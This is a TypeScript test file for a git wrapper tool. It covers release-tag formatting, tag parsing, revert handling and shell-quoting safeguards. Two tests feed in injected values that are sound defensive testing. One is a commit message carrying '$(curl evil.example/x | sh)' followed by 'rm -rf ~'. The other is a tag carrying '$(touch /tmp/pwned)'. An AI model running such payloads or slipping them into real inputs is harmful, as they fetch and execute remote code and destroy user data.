import { describe, expect, it } from 'bun:test';
import { GitTool } from './git-tool.ts';
import type { CodeExecTool } from './code-exec-tool.ts';

function fakeExecCapturingCommands(commands: string[]): CodeExecTool {
  return {
    async execute(args: any) {
      commands.push(args.command);
      return { success: true, data: { stdout: '', stderr: '', exitCode: 0, durationMs: 0 } };
    },
  } as CodeExecTool;
}

describe('GitTool', () => {
  const tool = new GitTool();

  it('formats deterministic release tags in dd-mm-yyyy-<short SHA> format', () => {
    const fixedDate = new Date(2026, 8, 7); // September 7, 2026
    const tag = tool.formatDefaultReleaseTag('a1b2c3d', fixedDate);
    expect(tag).toBe('07-09-2026-a1b2c3d');
  });

  it('validates required parameters for actions', async () => {
    const res1 = await tool.execute({ action: 'create_worktree' });
    expect(res1.success).toBe(false);
    expect(res1.error).toContain('Missing trackId');

    const res2 = await tool.execute({ action: 'cleanup_worktree' });
    expect(res2.success).toBe(false);
    expect(res2.error).toContain('Missing trackId');

    const res3 = await tool.execute({ action: 'unknown_action' as any });
    expect(res3.success).toBe(false);
    expect(res3.error).toContain('Unknown action');
  });

  it('handles diff action with empty diff when no changes exist', async () => {
    const res = await tool.execute({ action: 'diff' });
    expect(res.success).toBe(true);
    expect(typeof res.data?.diff).toBe('string');
  });

  it('list_tags returns an empty array without throwing when there is no git repo', async () => {
    const res = await tool.execute({ action: 'list_tags' });
    expect(res.success).toBe(true);
    expect(res.data?.tags).toEqual([]);
  });

  it('parses tab-separated for-each-ref output into tag/commit/createdAt records', () => {
    const stdout = [
      '07-09-2026-a1b2c3d\ta1b2c3d\t2026-09-07T14:10:00+00:00',
      '05-09-2026-9e0f1a2\t9e0f1a2\t2026-09-05T09:22:00+00:00',
    ].join('\n');

    const tags = tool.parseTagList(stdout);

    expect(tags).toEqual([
      { tag: '07-09-2026-a1b2c3d', commit: 'a1b2c3d', createdAt: '2026-09-07T14:10:00+00:00' },
      { tag: '05-09-2026-9e0f1a2', commit: '9e0f1a2', createdAt: '2026-09-05T09:22:00+00:00' },
    ]);
  });

  it('parseTagList ignores blank lines', () => {
    expect(tool.parseTagList('')).toEqual([]);
    expect(tool.parseTagList('\n\n')).toEqual([]);
  });

  it('revert requires a commitHash', async () => {
    const res = await tool.execute({ action: 'revert' });
    expect(res.success).toBe(false);
    expect(res.error).toContain('Missing commitHash');
  });

  it('revert surfaces a clear failure when the underlying git command fails', async () => {
    const res = await tool.execute({ action: 'revert', commitHash: 'deadbeef' });
    expect(res.success).toBe(false);
    expect(res.error).toContain('Revert failed');
  });

  it('head_sha returns an empty commitHash without throwing when there is no git repo', async () => {
    const res = await tool.execute({ action: 'head_sha' });
    expect(res.success).toBe(true);
    expect(typeof res.data?.commitHash).toBe('string');
  });

  it('neutralizes a command-injection attempt in a commit message (e.g. a hostile GitHub issue title)', async () => {
    const commands: string[] = [];
    const injectedTool = new GitTool(fakeExecCapturingCommands(commands));

    await injectedTool.execute({ action: 'commit', message: 'fix: $(curl evil.example/x | sh) "; rm -rf ~ #' });

    const commitCmd = commands.find(c => c.includes('git commit'));
    expect(commitCmd).toBeDefined();
    // The payload must be fully wrapped in single quotes, not double quotes — inside
    // double quotes, bash still expands $() and backticks even after quote-escaping.
    expect(commitCmd).toMatch(/^git commit -m '.*'$/s);
  });

  it('neutralizes a command-substitution injection in a release tag submitted via the Create Release form', async () => {
    // Double quotes do NOT stop $(...) or backtick expansion in POSIX shells — a tag
    // value never needs to "break out" of double quotes to execute code, which is why
    // single-quote wrapping (immune to $()/backticks) is required, not just quoting.
    const commands: string[] = [];
    const injectedTool = new GitTool(fakeExecCapturingCommands(commands));

    await injectedTool.execute({ action: 'release_tag', tag: '$(touch /tmp/pwned)' });

    const tagCmd = commands.find(c => c.startsWith('git tag'));
    expect(tagCmd).toBeDefined();
    expect(tagCmd).toMatch(/^git tag -a '.*' -m '.*'$/s);
  });
});
